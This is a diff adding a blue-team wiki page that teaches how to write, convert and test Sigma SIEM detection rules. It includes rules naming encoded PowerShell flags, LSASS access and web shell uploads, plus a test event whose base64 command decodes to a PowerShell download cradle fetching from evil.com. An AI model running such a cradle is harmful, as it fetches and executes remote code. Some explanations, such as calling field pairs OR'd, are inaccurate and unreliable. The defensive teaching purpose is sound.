@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Sigma | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Sigma">
+		<meta name="keywords" content="blueteam, detection, rules, siem, sigma, yaml">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Sigma">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Portable SIEM detection rules that you write once and convert to any backend query language.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/blueteam/sigma.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Sigma">
+		<meta name="twitter:description" itemprop="description" content="Portable SIEM detection rules that you write once and convert to any backend query language.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#concept">Concept</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#rule-anatomy">Rule Anatomy</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#logsource-definitions">Logsource Definitions</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#detection-logic">Detection Logic</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#field-modifiers">Field Modifiers</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#condition-expressions">Condition Expressions</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#writing-rules-for-common-attacks">Writing Rules for Common Attacks</a></b>
+					<ul>
+						<li><a href="#lsass-credential-dumping">LSASS Credential Dumping</a></li>
+						<li><a href="#service-creation">Service Creation</a></li>
+						<li><a href="#web-shell-upload">Web Shell Upload</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#sigma-cli">sigma-cli</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#sigma-pipelines">Sigma Pipelines</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#testing-with-sigma-cli">Testing with sigma-cli</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#performance-considerations">Performance Considerations</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#rule-management-at-scale">Rule Management at Scale</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#integration-with-detection-as-code">Integration with Detection-as-Code</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/blueteam/index.html">Blueteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/blueteam/sigma.html">Sigma</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="sigma">Sigma</h2>
+					<p>
+						Portable
+						<abbr title="Security Information and Event Management">SIEM</abbr>
+						detection rules that you write once
+						and convert to any backend query language.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Sigma is a vendor-neutral rule format for detection content. A single
+							<abbr title="Yet Another Markup Language">YAML</abbr>
+							document describes the log source, the fields to match, and a boolean condition, and a converter
+							rewrites that logic into the native query language of whatever
+							<abbr title="Security Information and Event Management">SIEM</abbr>
+							or endpoint platform you run. This article covers the rule anatomy, the field modifiers and
+							condition grammar, how pipelines adapt a rule to a backend, and how to test and version rules
+							like code.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">HTTP</a> - request/response structure, headers, methods, status codes</li>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - process lifecycle, /proc, command-line arguments</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="concept">Concept</h3>
+						<p>
+							Sigma is a generic, open signature format that allows you to write detection rules once and
+							convert them to the query language of any
+							<abbr title="Security Information and Event Management">SIEM</abbr>
+							platform. A rule written in Sigma
+							<abbr title="Yet Another Markup Language">YAML</abbr>
+							can be converted to Splunk
+							SPL, Elasticsearch Query DSL, QRadar AQL, Microsoft Sentinel KQL, and dozens of other backends.
+						</p>
+						<p>
+							The core insight: detection logic should be platform-independent. Your
+							<abbr title="Security Information and Event Management">SIEM</abbr>
+							will change. Your rules shouldn't.
+						</p>
+					</section>
+					<section>
+						<h3 id="rule-anatomy">Rule Anatomy</h3>
+						<p>
+							Every Sigma rule is a
+							<abbr title="Yet Another Markup Language">YAML</abbr>
+							document with a fixed structure:
+						</p>
+						<pre class="yaml">
+title: Suspicious Process Creation — CMD Launching PowerShell
+id: 8f0c99f1-2f3c-4c8f-8bee-1c6f3e0e8a31
+status: stable
+description: |
+  Detects cmd.exe spawning powershell.exe with encoded or hidden window flags.
+  Common pattern for fileless malware, download cradles, and post-exploitation.
+author: You
+date: 2026-06-26
+references:
+  - https://attack.mitre.org/techniques/T1059/001/
+tags:
+  - attack.execution
+  - attack.t1059.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_parent:
+    Image|endswith: &#39;\cmd.exe&#39;
+  selection_child:
+    Image|endswith: &#39;\powershell.exe&#39;
+    CommandLine|contains:
+      - &#39;-EncodedCommand&#39;
+      - &#39;-enc&#39;
+      - &#39;-e &#39;
+      - &#39;-WindowStyle Hidden&#39;
+      - &#39;-w hidden&#39;
+      - &#39;-nop&#39;
+      - &#39;-noprofile&#39;
+  condition: selection_parent and selection_child
+falsepositives:
+  - Administrative scripts that use encoded commands (rare — consider whitelisting)
+level: high
+						</pre>
+						<p>
+							<b>Mandatory fields</b>
+							:
+							<code>title</code>
+							,
+							<code>id</code>
+							(UUID v4 for uniqueness),
+							<code>status</code>
+							,
+							<code>description</code>
+							,
+							<code>logsource</code>
+							,
+							<code>detection</code>
+							.
+						</p>
+						<p>
+							<b>Status values</b>
+							:
+							<code>stable</code>
+							(vetted, low FPR),
+							<code>test</code>
+							(needs validation),
+							<code>experimental</code>
+							(draft,
+							expect FPs),
+							<code>deprecated</code>
+							(superseded),
+							<code>unsupported</code>
+							(abandoned).
+						</p>
+						<p>Generate a UUID:</p>
+						<pre class="bash">
+uuidgen
+# Output: 8f0c99f1-2f3c-4c8f-8bee-1c6f3e0e8a31
+						</pre>
+					</section>
+					<section>
+						<h3 id="logsource-definitions">Logsource Definitions</h3>
+						<p>
+							The
+							<code>logsource</code>
+							section defines which log type the rule applies to:
+						</p>
+						<pre class="yaml">
+# Windows Security Event Log
+logsource:
+  product: windows
+  service: security
+
+# Sysmon process creation (EventID 1)
+logsource:
+  product: windows
+  service: sysmon
+
+# Linux auditd logs
+logsource:
+  product: linux
+  service: auditd
+  category: process_creation
+
+# Generic web server logs
+logsource:
+  product: webserver
+  service: access
+
+# Firewall logs (product-agnostic)
+logsource:
+  category: firewall
+						</pre>
+						<p>
+							The
+							<code>product</code>
+							field identifies the OS/application. The
+							<code>service</code>
+							identifies the specific log
+							source within that product. The
+							<code>category</code>
+							is a high-level event type that can apply across
+							products.
+						</p>
+					</section>
+					<section>
+						<h3 id="detection-logic">Detection Logic</h3>
+						<p>
+							The
+							<code>detection</code>
+							section defines named sub-expressions (called "search identifiers") and a boolean
+							<code>condition</code>
+							that combines them.
+						</p>
+						<pre class="yaml">
+detection:
+  # Search identifier: finds events matching these field-value pairs
+  selection_powershell:
+    Image|endswith: &#39;\powershell.exe&#39;
+
+  selection_network:
+    Initiated: true
+    DestinationPort: 443
+
+  # Filter identifier: excludes matching events
+  filter_legitimate:
+    DestinationIp|startswith: &#39;10.0.0.&#39;
+
+  # Timeframe: events within 30 seconds of each other
+  timeframe: 30s
+
+  # Condition: boolean logic combining identifiers
+  condition: selection_powershell and selection_network and not filter_legitimate
+						</pre>
+						<p>
+							<b>Search identifiers</b>
+							logically OR their field-value pairs. Values listed as
+							<abbr title="Yet Another Markup Language">YAML</abbr>
+							arrays are OR'd within that field.
+						</p>
+						<pre class="yaml">
+selection:
+  CommandLine|contains:
+    - &#39;-enc&#39;        # matches if CommandLine contains &#34;-enc&#34;
+    - &#39;-Encoded&#39;    # OR if CommandLine contains &#34;-Encoded&#34;
+  Image|endswith: &#39;\powershell.exe&#39;  # AND Image must end with \powershell.exe
+						</pre>
+					</section>
+					<section>
+						<h3 id="field-modifiers">Field Modifiers</h3>
+						<p>
+							Modifiers are appended to field names with
+							<code>|</code>
+							:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Modifier</th>
+									<th align="center">Description</th>
+									<th align="center">Example</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>contains</code></td>
+									<td align="center">Substring match</td>
+									<td align="center"><code>CommandLine\|contains: &#39;whoami&#39;</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>startswith</code></td>
+									<td align="center">Prefix match</td>
+									<td align="center"><code>Image\|startswith: &#39;C:\\Windows\\&#39;</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>endswith</code></td>
+									<td align="center">Suffix match</td>
+									<td align="center"><code>Image\|endswith: &#39;\cmd.exe&#39;</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>re</code></td>
+									<td align="center">Regex match</td>
+									<td align="center"><code>CommandLine\|re: &#39;.*-enc [A-Za-z0-9+/=]{100,}&#39;</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>gt</code>/<code>lt</code>/<code>gte</code>/<code>lte</code></td>
+									<td align="center">Numeric comparison</td>
+									<td align="center"><code>dst_port\|gt: 1024</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>all</code></td>
+									<td align="center">All values must match (AND within a list)</td>
+									<td align="center"><code>CommandLine\|all: [&#39;-nop&#39;, &#39;-enc&#39;]</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>cased</code></td>
+									<td align="center">Case-sensitive match (off by default)</td>
+									<td align="center"><code>Image\|endswith\|cased: &#39;\cmd.exe&#39;</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>base64</code></td>
+									<td align="center">Field value is base64-encoded</td>
+									<td align="center"><code>CommandLine\|base64: &#39;d2hvYW1p&#39;</code></td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="condition-expressions">Condition Expressions</h3>
+						<pre class="yaml">
+# Simple conditions
+condition: selection
+condition: selection_1 and selection_2
+condition: selection_1 or selection_2
+condition: selection_1 and not filter_1
+
+# Complex conditions
+condition: (selection_1 or selection_2) and not filter_1
+
+# Counting: alert if N of M conditions are true
+condition: 2 of them
+# &#34;them&#34; refers to all search identifiers NOT starting with &#34;filter_&#34;
+
+condition: 1 of selection_*
+# Matches if any identifier starting with &#34;selection_&#34; is true
+
+condition: all of selection_*
+# Short for: selection_1 and selection_2 and ...
+
+condition: 1 of them and not 1 of filter_*
+
+# Near: events within a time window
+detection:
+  selection_a:
+    EventID: 4688
+    NewProcessName|endswith: &#39;\net.exe&#39;
+  selection_b:
+    EventID: 5156
+    Application|endswith: &#39;\net.exe&#39;
+  timeframe: 60s
+  condition: selection_a | near selection_b
+						</pre>
+					</section>
+					<section>
+						<h3 id="writing-rules-for-common-attacks">Writing Rules for Common Attacks</h3>
+						<h4 id="lsass-credential-dumping">LSASS Credential Dumping</h4>
+						<pre class="yaml">
+title: LSASS Memory Access by Unsigned Binary
+id: 32d0d3e2-e58a-4c2f-b0db-2e3c755d7e1b
+status: stable
+description: Detects non-Microsoft processes accessing LSASS memory.
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 10
+    TargetImage|endswith: &#39;\lsass.exe&#39;
+    SourceImage|startswith: &#39;C:\Windows\&#39;
+  filter_system:
+    SourceImage|contains:
+      - &#39;C:\Windows\System32\&#39;
+      - &#39;C:\Windows\SysWOW64\&#39;
+      - &#39;C:\Windows\SystemApps\&#39;
+  condition: selection and not filter_system
+level: high
+						</pre>
+						<h4 id="service-creation">Service Creation</h4>
+						<pre class="yaml">
+title: New Service Created with Suspicious Binary Path
+id: 0fa0a8c7-c8e0-4acb-9d3c-27a5f3e4f2d1
+status: stable
+description: Detects service creation where the binary path points to temp or user-writable directories.
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4697
+    ServiceFileName|contains:
+      - &#39;C:\Users\&#39;
+      - &#39;C:\Windows\Temp\&#39;
+      - &#39;C:\ProgramData\&#39;
+      - &#39;\AppData\&#39;
+  filter_adobe:
+    ServiceFileName|contains: &#39;Adobe&#39;
+  condition: selection and not filter_adobe
+falsepositives:
+  - Legitimate software installed to user profile (e.g., Chrome updater, OneDrive, Teams)
+level: medium
+						</pre>
+						<h4 id="web-shell-upload">Web Shell Upload</h4>
+						<pre class="yaml">
+title: Web Shell Upload — PHP File in Upload Directory
+id: 5b3a2c1d-8f4e-4a6b-9c1d-2e3f4a5b6c7d
+status: stable
+description: Detects successful POST requests uploading PHP files to web-accessible directories.
+logsource:
+  product: linux
+  service: apache
+detection:
+  selection:
+    cs-method: POST
+    sc-status: 200
+    cs-uri-stem|endswith: &#39;.php&#39;
+    cs-uri-stem|contains: &#39;/uploads/&#39;
+  timeframe: 10s
+  condition: selection | count() by cs-username &gt; 3
+level: medium
+						</pre>
+					</section>
+					<section>
+						<h3 id="sigma-cli">sigma-cli</h3>
+						<p>
+							The
+							<code>sigma</code>
+							CLI tool converts rules between formats and validates rule syntax.
+						</p>
+						<pre class="bash">
+# Install on ArchLinux
+sudo pacman -S python-pipx
+pipx install sigma-cli
+
+# Add a backend plugin, for example the Splunk backend
+pipx inject sigma-cli pysigma-backend-splunk
+						</pre>
+						<p>Common operations:</p>
+						<pre class="bash">
+# Validate all rules in a directory
+sigma check rules/
+
+# Convert a Sigma rule to Splunk SPL
+sigma convert -t splunk rules/windows/process_creation/suspicious_powershell.yml
+
+# Convert to Elasticsearch Lucene query
+sigma convert -t es-ql rules/linux/webserver_web_shell.yml
+
+# Convert to Microsoft Sentinel KQL
+sigma convert -t sentinel rules/windows/credential_access/lsass_dump.yml
+
+# List available backends (target formats)
+sigma list targets
+
+# List available pipelines (processing chains)
+sigma list pipelines
+						</pre>
+						<p>Output example - Sigma to Splunk:</p>
+						<pre class="bash">
+sigma convert -t splunk rules/suspicious_powershell.yml
+						</pre>
+						<pre class="plaintext">
+(Image=&#34;*\\cmd.exe&#34;) (Image=&#34;*\\powershell.exe&#34; (CommandLine=&#34;*-EncodedCommand*&#34; OR CommandLine=&#34;*-enc*&#34;))
+						</pre>
+					</section>
+					<section>
+						<h3 id="sigma-pipelines">Sigma Pipelines</h3>
+						<p>
+							Pipelines transform rules between the generic Sigma format and backend-specific queries. The
+							pipeline handles field name mappings, log source selectors, and backend quirks.
+						</p>
+						<pre class="yaml">
+# Example pipeline stage: field name mapping
+name: windows_field_mapping
+priority: 10
+transformations:
+  - type: field_name_mapping
+    mapping:
+      Image: NewProcessName
+      CommandLine: ProcessCommandLine
+      EventID: EventCode
+						</pre>
+						<p>Pipeline stages execute in priority order. Standard pipeline stages:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Stage</th>
+									<th align="center">Purpose</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>logsource selection</code></td>
+									<td align="center">Map Sigma logsource to backend index/table</td>
+								</tr>
+								<tr>
+									<td align="center"><code>field name resolution</code></td>
+									<td align="center">Map Sigma field names to backend field names</td>
+								</tr>
+								<tr>
+									<td align="center"><code>value transformation</code></td>
+									<td align="center">Convert Sigma values (regex -> backend regex, contains -> wildcard)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>condition transformation</code></td>
+									<td align="center">Convert Sigma condition to backend boolean expression</td>
+								</tr>
+								<tr>
+									<td align="center"><code>output formatting</code></td>
+									<td align="center">Wrap in backend-specific boilerplate</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="testing-with-sigma-cli">Testing with sigma-cli</h3>
+						<pre class="bash">
+# Write a test event document
+cat &gt; test_events/powershell_encoded.yml &lt;&lt; &#39;EOF&#39;
+title: PowerShell Encoded Command Test
+logsource:
+  product: windows
+  category: process_creation
+tests:
+  - name: Encoded download cradle
+    log:
+      Image: &#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;
+      CommandLine: &#39;powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AbQBhAGwALgBlAHgAZQAnACkA&#39;
+    should_match: true
+  - name: Normal PowerShell
+    log:
+      Image: &#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;
+      CommandLine: &#39;powershell.exe -Command Get-Process&#39;
+    should_match: false
+EOF
+
+# Run tests against the rule
+sigma test rules/suspicious_powershell.yml test_events/powershell_encoded.yml
+						</pre>
+					</section>
+					<section>
+						<h3 id="performance-considerations">Performance Considerations</h3>
+						<ol>
+							<li><b>Prefer startswith/endswith over contains</b> - they enable index prefix scans. <code>contains</code> requires a full scan.</li>
+						</ol>
+						<ol>
+							<li><b>Never use regex on high-volume events</b> - process creation events can number hundreds per second. A regex across the full command line on every event will kill <abbr title="Security Information and Event Management">SIEM</abbr> performance.</li>
+						</ol>
+						<ol>
+							<li><b>Use EventID as first filter</b> - EventID is indexed, narrows the search to a tiny fraction of events before evaluating other conditions.</li>
+						</ol>
+						<ol>
+							<li><b>Aggregation rules are expensive</b> - <code>count() by</code> , <code>near</code> , and <code>timeframe</code> require stateful tracking. Use sparingly on high-volume log sources.</li>
+						</ol>
+						<ol>
+							<li><b>Filter early, filter often</b> - <code>not filter_*</code> conditions should appear as early as possible in the condition to short-circuit evaluation.</li>
+						</ol>
+					</section>
+					<section>
+						<h3 id="rule-management-at-scale">Rule Management at Scale</h3>
+						<pre class="bash">
+# Directory layout for rule repository
+rules/
+├── windows/
+│   ├── process_creation/
+│   │   ├── suspicious_powershell_encoded.yml
+│   │   ├── wmic_process_call_create.yml
+│   │   └── service_execution_from_temp.yml
+│   ├── sysmon/
+│   │   ├── lsass_memory_access.yml
+│   │   ├── process_injection.yml
+│   │   └── registry_persistence.yml
+│   └── security/
+│       ├── user_added_to_admin_group.yml
+│       └── audit_log_cleared.yml
+├── linux/
+│   ├── process_creation/
+│   │   ├── base64_encoded_pipe_execution.yml
+│   │   └── suspicious_crontab_entry.yml
+│   └── apache/
+│       ├── web_shell_upload.yml
+│       └── sql_injection_attempt.yml
+├── cloud/
+│   ├── aws/
+│   │   ├── s3_bucket_public_access.yml
+│   │   └── root_account_usage.yml
+│   └── azure/
+│       └── conditional_access_bypass.yml
+└── tests/
+    ├── process_creation/
+    │   └── powershell_encoded.yml
+    └── apache/
+        └── web_shell_upload.yml
+						</pre>
+					</section>
+					<section>
+						<h3 id="integration-with-detection-as-code">Integration with Detection-as-Code</h3>
+						<pre class="bash">
+#!/bin/bash
+# CI pipeline: validate all rules, run tests, convert to backend
+set -e
+
+echo &#34;=== Validating Sigma rules ===&#34;
+sigma check rules/**/*.yml
+
+echo &#34;=== Running tests ===&#34;
+find tests -name &#39;*.yml&#39; -exec sigma test {} \;
+
+echo &#34;=== Converting to Splunk ===&#34;
+mkdir -p output/splunk
+find rules -name &#39;*.yml&#39; ! -path &#39;*/tests/*&#39; \
+  -exec sigma convert -t splunk -o output/splunk/ {} \;
+
+echo &#34;=== Converting to Elasticsearch ===&#34;
+mkdir -p output/es
+find rules -name &#39;*.yml&#39; ! -path &#39;*/tests/*&#39; \
+  -exec sigma convert -t es-ql -o output/es/ {} \;
+
+echo &#34;=== All checks passed ===&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Deploy the lab container. It seeds three rules, matching test events, and a conversion script
+							under
+							<code>/opt/exercise</code>
+							. Complete the open task: write a rule that detects suspicious scheduled
+							task creation (Windows Event ID 4698), then validate it with
+							<code>sigma check</code>
+							,
+							<code>sigma test</code>
+							,
+							and
+							<code>sigma convert -t splunk</code>
+							.
+						</p>
+						<p><a href="/wiki/articles/blueteam/sigma.Containerfile">sigma.Containerfile</a></p>
+						<pre class="bash">
+podman build -t sigma-lab -f sigma.Containerfile .
+podman run -it --rm sigma-lab
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://sigmahq.io/docs/basics/" target="_blank">Sigma Specification</a></li>
+							<li><a class="icon-github" href="https://github.com/SigmaHQ/sigma" target="_blank">Sigma Rules Repository</a></li>
+							<li><a class="icon-github" href="https://github.com/SigmaHQ/sigma-cli" target="_blank">sigma-cli Documentation</a></li>
+							<li><a class="icon-website" href="https://uncoder.io/" target="_blank">Sigma vs. Uncoder.io</a> - alternative converter (web-based)</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
